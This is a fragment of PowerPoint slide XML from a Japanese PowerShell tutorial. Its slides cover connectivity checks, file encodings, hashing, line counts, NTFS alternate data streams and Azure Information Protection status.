                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemoteAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PingSucceeded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ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemoteAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>         </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PingSucceeded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------------ -------------         -------------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ntt.com      61.113.104.9                   True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iij.ad.jp    2001:240:bb81::10:191          True</a:t>
            </a:r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24F43A2C-1BB8-9BEA-A2AB-4E433B1BBA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013435"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="9588388" y="1354781"/>
          <a:ext cx="1718621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621">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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domains.csv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14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sz="20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Domain</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="20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ntt.com</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="20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iij.ad.jp</a:t>
                      </a:r>
                      <a:endParaRPr lang="ja-JP" altLang="en-US" sz="200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370361"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA23BD2A-2496-52C6-31CC-ED01E90F1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4480084"/>
            <a:ext cx="9720202" cy="1469633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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ConvertFrom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-Csv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で、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CSV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ファイルをオブジェクトに変換。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>このとき、プロパティ名＝ヘッダー名（今回では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Domain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）になる。</a:t>
            </a:r>
          </a:p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solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Calculated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Properties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を使い、パイプ後続の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Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>NetConnection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が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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>受け入れ可能なプロパティ名を作成する。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4962570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A6010224-187C-F254-605A-9EA34058A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ファイル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8924729-2011-D746-345D-00181B81F3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E9D71A4-80F4-2315-FCBE-B49C1C77A6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27</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A017CB7B-2EB1-A0A2-B8E0-B86595975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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ファイル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永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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02508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56E744-64A5-E196-D2A4-81BEA8B6D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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイル</a:t>
            </a:r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EC43BE6-B07B-50C6-6682-95CB214D06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6BCDBB2-B262-906A-FFD4-784E0833EF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28</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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ED6F9964-8595-86DB-F859-78471FA67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9" y="942581"/>
            <a:ext cx="9288153" cy="677108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ファイル出力には、リダイレクト（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&gt;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）ではなく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Out-File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を使用する。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>リダイレクトでは文字コードが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UTF-16LE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に固定されるため。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60E5D62-156A-F546-BCA5-3535486C0A21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1675599"/>
            <a:ext cx="10430709" cy="14157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Write-Output hello &gt; hello.txt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 Get-Content -Path .\hello.txt -Encoding Byte | Format-Hex</a:t>
            </a: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dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F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00000000   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FF FE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>68 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 65 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 6C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 6C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 6F </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 0D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 0A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>þh.e.l.l.o</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>..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FE619A2-B197-8DAB-FAB6-52BFA67251F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="3217884"/>
            <a:ext cx="10430709" cy="1477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Write-Output hello | Out-File hello.txt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Encoding UTF8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 Get-Content -Path .\hello.txt -Encoding Byte | Format-Hex</a:t>
            </a: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           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F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00000000   EF BB BF 68 65 6C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>6C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 6F 0D 0A                    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ï»¿hello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>..</a:t>
            </a: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12370229-E3E7-A356-7971-35B6C9D83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9" y="4988425"/>
            <a:ext cx="10430709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PowerShell 7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のリダイレクトは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UTF-8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で出力。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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Enconding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 Byte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は廃止。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7640BB6-0EB6-DF2A-DF5C-36185B63CAD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="5373216"/>
            <a:ext cx="10430709" cy="40011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Get-Content -Path .\hello.txt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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AsByteStream</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | Format-Hex</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34401438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37853F-56E8-55E7-0ECE-B6009627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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>外形</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>md5sum</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>wc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>）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1B77AFA-2E2E-F1B4-A1BB-204E2D7DAD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9BF9F7E-2DE1-0112-D782-58ED7B196A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29</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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153FB942-6494-8D60-E77D-EE8970232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9" y="915867"/>
            <a:ext cx="7631970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ハッシュ値を取得する（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UNIX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の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md5sum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コマンド）。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08645F8-E8EC-47E1-2C51-EA592285BEA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1273984"/>
            <a:ext cx="10430709" cy="1785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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FileHash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path S:\*.pdf -Algorithm MD5 | Format-Table -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Autosize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Algorithm Hash                             Path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--------- ----                             ----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MD5       49E458EA53F8FF82CD82DF4850CC95D2 S:\000103970.pdf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MD5       C0FA91CF975A19FD2C7C8E97B611947A S:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>狩猟の民族誌</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>_2014.pdf</a:t>
            </a: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FED19E09-A6E1-4FDC-0F7E-40EABEA40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3632429"/>
            <a:ext cx="8388054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ログファイルの行数などを確認する（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UNIX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の</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>wc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コマンド）。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E9C79D0-9DCF-AA24-15C3-FA03FA257226}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="3990546"/>
            <a:ext cx="10430709" cy="1477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Get-Content -Path S:\s3log.txt | Measure-Object -Line -Word -Character</a:t>
            </a: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Lines Words Characters Property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----- ----- ---------- --------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   37   974      16973</a:t>
            </a:r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23FF698A-E0F3-61A7-DCF2-2965FD081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5560204"/>
            <a:ext cx="10440990" cy="677108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Measure-Object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はパラメーターなしで使用すると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Count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が表示される。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>数値型向けには、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-Average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、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-Maximum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、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-Minimum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、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-Sum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がある。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BF3C7802-10E9-351F-E444-0996F08B2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710" y="3162454"/>
            <a:ext cx="10440990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MD5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のほか、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SHA1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、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SHA256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、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SHA512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などが指定可能。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35784215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37853F-56E8-55E7-0ECE-B6009627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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| NTFS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>代替データストリーム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1B77AFA-2E2E-F1B4-A1BB-204E2D7DAD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9BF9F7E-2DE1-0112-D782-58ED7B196A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30</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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153FB942-6494-8D60-E77D-EE8970232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9" y="915867"/>
            <a:ext cx="7631970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代替データストリーム（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ADS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）の有無を確認する。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08645F8-E8EC-47E1-2C51-EA592285BEA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1273984"/>
            <a:ext cx="10430709" cy="22467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Get-Item -Path S:\WmiExplorer_2.0.0.2.zip </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Stream *</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, Stream, Length</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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FileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>                   Stream          Length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--------                   ------          ------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S:\WmiExplorer_2.0.0.2.zip :$DATA          226095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S:\WmiExplorer_2.0.0.2.zip </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Zone.Identifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    652</a:t>
            </a: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FED19E09-A6E1-4FDC-0F7E-40EABEA40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3704434"/>
            <a:ext cx="9864218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 err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Zone.Identifier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を外す（＝プロパティのセキュリティ項目で「許可」）。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E9C79D0-9DCF-AA24-15C3-FA03FA257226}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="4062551"/>
            <a:ext cx="10430709" cy="22467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Unblock-File -Path S:\WmiExplorer_2.0.0.2.zip</a:t>
            </a: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&gt; Get-Item -Path S:\WmiExplorer_2.0.0.2.zip -Stream *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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, Stream, Length</a:t>
            </a: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FileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>                   Stream          Length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--------                   ------          ------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S:\WmiExplorer_2.0.0.2.zip :$DATA          226095</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42816941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AF22A3-8DF3-9274-664E-B6BB1BD2C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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>アクセス権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2FCA026-9B4E-8F4C-4A92-23ADA27374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BE08298-ED0B-9100-934D-479E960664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31</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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1E49A307-3418-E5CE-D7A6-8928FAE34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9" y="3426857"/>
            <a:ext cx="10656305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Azure Information Protection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保護状況を確認する（要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AIP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クライアント）。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4248F9E-4C7A-0F8E-9739-D891A60CD16E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="3784974"/>
            <a:ext cx="6903197" cy="40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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AIPFileStatus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path S:\AIP_protected.docx </a:t>
            </a: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2145264A-BB92-DA6D-D491-8ABDC31C7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9" y="4329098"/>
            <a:ext cx="10368273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AIP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保護された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Office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文書は、拡張子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.docx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でも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OLE2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形式（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ZIP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ではない）。</a:t>
            </a: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8503DC0-E544-1C67-F53A-71A92E928D1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1343472" y="4667652"/>
            <a:ext cx="9963537" cy="1569660"/>
            <a:chOff x="1343472" y="2204864"/>
            <a:chExt cx="9963537" cy="1569660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E586164C-375B-5352-EE76-510145CB788C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1343472" y="2204864"/>
              <a:ext cx="9963537" cy="15696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r>
